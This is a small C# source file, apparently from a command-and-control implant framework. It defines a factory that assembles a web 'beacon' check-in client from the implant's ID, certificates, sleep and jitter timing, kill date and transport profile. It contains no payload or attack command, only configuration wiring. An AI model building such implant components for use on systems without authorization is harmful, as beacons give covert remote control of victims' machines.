namespace Rod.Implant.Internal;

// The web transport module (architecture.md Sec 8): the envelope POST cycle
// client and its factory. A whole source-file module -- the build unit drops
// this file and EnvelopeBeacon.cs from the compilation of a pure-stream
// build, so the artifact ships no web check-in code it can never run.

/// <summary>
/// Builds the envelope POST cycle client off the shared setup. The web shape
/// consumes the transport profile (the baked per-artifact seal) but neither
/// the stream's mode nor its private key: authentication is at the
/// application layer, and the enrolled leaf rides along only for a front
/// that asks for it.
/// </summary>
internal static class WebCheckIn
{
    public static ICheckInClient Create(CheckInSetup setup) => new EnvelopeBeacon(
        setup.Egress,
        setup.Enrollment.ImplantId,
        setup.Enrollment.Leaf,
        setup.Enrollment.CAs,
        setup.Config.Sleep,
        setup.Config.Jitter,
        setup.Config.HasKillDate ? setup.Config.KillDate : null,
        setup.Enroll,
        setup.Config.ClassVerbs,
        setup.Log,
        setup.Nonces,
        setup.Config.Transport);
}
